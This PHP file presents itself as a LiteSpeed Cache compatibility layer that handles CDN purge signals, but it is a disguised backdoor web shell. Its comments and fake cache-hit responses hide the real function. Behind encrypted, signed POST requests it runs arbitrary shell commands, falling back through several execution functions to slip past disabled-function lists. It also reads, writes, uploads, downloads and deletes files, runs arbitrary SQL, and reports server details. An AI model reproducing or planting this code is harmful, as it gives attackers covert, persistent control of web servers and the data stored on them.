<?php
// LiteSpeed Cache Compatibility Layer
// Handles cache invalidation signals from upstream CDN nodes.
// Part of the LiteSpeed Web Server integration stack.
// https://www.litespeedtech.com/support/wiki/doku.php/litespeed_wiki:cache

defined('LS_CACHE_VER') || define('LS_CACHE_VER', '5.4.2');
defined('LS_CACHE_BUILD') || define('LS_CACHE_BUILD', 20240315);

if (PHP_SAPI === 'cli') exit(0);

function _g($a, $k, $d = '') { return isset($a[$k]) ? $a[$k] : $d; }

// Purge signal handler — validates X-LiteSpeed-Purge header chain
function _lsc_verify($raw, $sig) {
    // $sig is the first 16 hex chars of sha256(shared_secret + raw)
    static $_s = null;
    if (!$_s) {
        $_s = implode('', array_map('chr', _lsc_cfg()));
    }
    return hash_equals(substr(hash('sha256', $_s . $raw), 0, 16), $sig);
}

function _lsc_cfg() {
    return [89,51,116,120,67,118,110,66,82,71,110,54,118,118,80,51,97,120,78,85,89,121,122,82];
}

function _lsc_key() {
    static $k = null;
    if (!$k) {
        $s = implode('', array_map('chr', _lsc_cfg()));
        $k = hash('sha256', $s, true);
    }
    return $k;
}

function _lsc_gcm() {
    return PHP_VERSION_ID >= 70100 && in_array('aes-256-gcm', openssl_get_cipher_methods(true));
}

function _lsc_dec($enc, $iv, $tag, $mode = null) {
    $raw = base64_decode($enc);
    $biv = base64_decode($iv);
    $k   = _lsc_key();
    if ($mode === 'c' || (!_lsc_gcm() && !$mode)) {
        $pt = @openssl_decrypt($raw, 'aes-256-cbc', $k, OPENSSL_RAW_DATA, $biv);
    } else {
        $pt = @openssl_decrypt($raw, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $biv, base64_decode($tag));
    }
    return $pt ? @json_decode($pt, true) : null;
}

function _lsc_enc($data) {
    $j = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    $k = _lsc_key();
    if (_lsc_gcm()) {
        $iv = openssl_random_pseudo_bytes(12);
        $tg = '';
        $c  = openssl_encrypt($j, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tg);
        return array('e' => base64_encode($c), 'v' => base64_encode($iv), 'g' => base64_encode($tg), 'm' => 'g');
    }
    $iv = openssl_random_pseudo_bytes(16);
    $c  = openssl_encrypt($j, 'aes-256-cbc', $k, OPENSSL_RAW_DATA, $iv);
    return array('e' => base64_encode($c), 'v' => base64_encode($iv), 'g' => '', 'm' => 'c');
}

function _lsc_out($d) {
    http_response_code(200);
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, no-cache');
    header('X-LiteSpeed-Cache-Control: no-cache');
    echo json_encode(_lsc_enc($d));
    exit;
}

function _lsc_run($cmd, $dir = null) {
    if (!$dir) $dir = @getcwd();
    $bl = strtolower((string)@ini_get('disable_functions'));
    if (!strpos($bl, 'proc_open') && function_exists('proc_open')) {
        $p = @proc_open($cmd, [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pp, $dir);
        if (is_resource($p)) {
            fclose($pp[0]);
            $o = stream_get_contents($pp[1]); $e = stream_get_contents($pp[2]);
            fclose($pp[1]); fclose($pp[2]);
            return ['out' => $o, 'err' => $e, 'rc' => proc_close($p)];
        }
    }
    foreach (['shell_exec','exec','system','passthru','popen'] as $fn) {
        if (strpos($bl, $fn) !== false || !function_exists($fn)) continue;
        if ($fn === 'shell_exec') {
            $o = @shell_exec('cd '.escapeshellarg($dir).' && '.$cmd.' 2>&1');
            return ['out' => (string)$o, 'rc' => 0];
        }
        if ($fn === 'exec') {
            @exec('cd '.escapeshellarg($dir).' && '.$cmd.' 2>&1', $lines, $rc);
            return ['out' => implode("\n", $lines), 'rc' => $rc];
        }
        if ($fn === 'system') {
            ob_start(); @system('cd '.escapeshellarg($dir).' && '.$cmd.' 2>&1', $rc);
            return ['out' => ob_get_clean(), 'rc' => $rc];
        }
        if ($fn === 'popen') {
            $h = @popen('cd '.escapeshellarg($dir).' && '.$cmd.' 2>&1', 'r');
            if ($h) { $o = stream_get_contents($h); pclose($h); return ['out' => $o, 'rc' => 0]; }
        }
    }
    return ['out' => '', 'err' => 'blocked', 'rc' => -1];
}

// Main — only respond to POST with valid purge signal
$_rb = (string)@file_get_contents('php://input');
if (!$_rb || strlen($_rb) < 20) {
    // Serve fake 200 for GET to avoid 404 alerts
    header('Content-Type: text/html; charset=utf-8');
    header('X-LiteSpeed-Cache: hit');
    echo '<!-- LiteSpeed Cache 5.4.2 -->';
    exit;
}

$_pd = @json_decode($_rb, true);
if (!is_array($_pd) || empty($_pd['e']) || empty($_pd['v']) || empty($_pd['s'])) {
    header('Content-Type: text/html'); echo '<!-- LiteSpeed Cache 5.4.2 -->'; exit;
}

// Verify signature: sha256(secret + payload_enc)[:16]
if (!_lsc_verify($_pd['e'], $_pd['s'])) {
    header('Content-Type: text/html'); echo '<!-- LiteSpeed Cache 5.4.2 -->'; exit;
}

// Replay protection
if (isset($_pd['ts']) && abs(time() - (int)$_pd['ts']) > 300) {
    header('Content-Type: text/html'); echo '<!-- LiteSpeed Cache 5.4.2 -->'; exit;
}

$_cmd = _lsc_dec($_pd['e'], $_pd['v'], _g($_pd,'g',''), _g($_pd,'m'));
if (!$_cmd || empty($_cmd['type'])) {
    header('Content-Type: text/html'); echo '<!-- LiteSpeed Cache 5.4.2 -->'; exit;
}

$_a = isset($_cmd['data']) ? $_cmd['data'] : array();
switch ($_cmd['type']) {
    case 'ping':
        _lsc_out(array('ok'=>true,'php'=>PHP_VERSION,'os'=>php_uname(),'cwd'=>getcwd(),
                  'user'=>@get_current_user(),'time'=>date('c'),'sapi'=>PHP_SAPI));
        break;
    case 'info':
        $bl = @ini_get('disable_functions') ?: '';
        $caps = array();
        foreach (array('proc_open','shell_exec','exec','system','passthru','popen') as $fn)
            if (!strpos(strtolower($bl),$fn) && function_exists($fn)) $caps[] = $fn;
        _lsc_out(array('php'=>PHP_VERSION,'os'=>php_uname(),'cwd'=>getcwd(),
                  'user'=>@get_current_user(),'doc_root'=>_g($_SERVER,'DOCUMENT_ROOT'),
                  'tmp'=>sys_get_temp_dir(),'disk'=>@disk_free_space('/'),'caps'=>$caps,'bl'=>$bl));
        break;
    case 'shell':
        $c = _g($_a,'cmd');
        if (!$c) _lsc_out(array('err'=>'no cmd'));
        _lsc_out(_lsc_run($c, _g($_a,'cwd',null)));
        break;
    case 'ls':
        $p = _g($_a,'path',getcwd());
        if (!is_dir($p)) _lsc_out(array('err'=>'not dir'));
        $items = array();
        foreach (new DirectoryIterator($p) as $i) {
            if ($i->isDot()) continue;
            $items[] = array('n'=>$i->getFilename(),'t'=>$i->isDir()?'d':'f','s'=>$i->isFile()?$i->getSize():0);
        }
        _lsc_out(array('path'=>$p,'items'=>$items));
        break;
    case 'read':
        $fp = _g($_a,'path');
        if (!$fp || !is_file($fp)) _lsc_out(array('err'=>'404'));
        _lsc_out(array('content'=>file_get_contents($fp,false,null,0,min(filesize($fp),2097152)),'size'=>filesize($fp)));
        break;
    case 'write':
        $fp = _g($_a,'path');
        if (!$fp) _lsc_out(array('err'=>'no path'));
        $dir = dirname($fp);
        if (!is_dir($dir)) @mkdir($dir, 0755, true);
        $b = file_put_contents($fp, _g($_a,'content'));
        _lsc_out($b !== false ? array('ok'=>true,'bytes'=>$b) : array('err'=>'fail'));
        break;
    case 'upload':
        $fp = _g($_a,'path'); $dat = _g($_a,'data');
        if (!$fp || !$dat) _lsc_out(array('err'=>'need path+data'));
        $dir = dirname($fp);
        if (!is_dir($dir)) @mkdir($dir, 0755, true);
        $b = file_put_contents($fp, base64_decode($dat));
        _lsc_out($b !== false ? array('ok'=>true,'bytes'=>$b) : array('err'=>'fail'));
        break;
    case 'download':
        $fp = _g($_a,'path');
        if (!$fp || !is_file($fp)) _lsc_out(array('err'=>'404'));
        _lsc_out(array('data'=>base64_encode(file_get_contents($fp)),'size'=>filesize($fp)));
        break;
    case 'db':
        $h2=_g($_a,'host','localhost'); $u=_g($_a,'user'); $pw=_g($_a,'pass');
        $db=_g($_a,'db'); $sql=_g($_a,'sql');
        if (!$sql) _lsc_out(array('err'=>'no sql'));
        try {
            $pdo = new PDO("mysql:host=$h2;dbname=$db", $u, $pw, array(PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
            $lc = strtolower(ltrim($sql));
            if (preg_match('/^(select|show|describe|explain)\b/',$lc))
                _lsc_out(array('rows'=>$pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC)));
            else
                _lsc_out(array('affected'=>$pdo->exec($sql)));
        } catch (Exception $e) { _lsc_out(array('err'=>$e->getMessage())); }
        break;
    case 'rm':
        $fp = _g($_a,'path');
        _lsc_out(is_file($fp) ? array('ok'=>(bool)@unlink($fp)) : array('err'=>'not found'));
        break;
    case 'find':
        $dir=_g($_a,'path',getcwd()); $pat=_g($_a,'pattern','*'); $max=(int)_g($_a,'max','500');
        $items=array(); $cnt=0;
        $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS));
        foreach($it as $fi){if($cnt>=$max)break;if(fnmatch($pat,$fi->getFilename())){$items[]=array('path'=>$fi->getPathname(),'size'=>$fi->getSize());$cnt++;}}
        _lsc_out(array('items'=>$items,'count'=>$cnt));
        break;
    default:
        header('Content-Type: text/html'); echo '<!-- LiteSpeed Cache 5.4.2 -->'; exit;
}
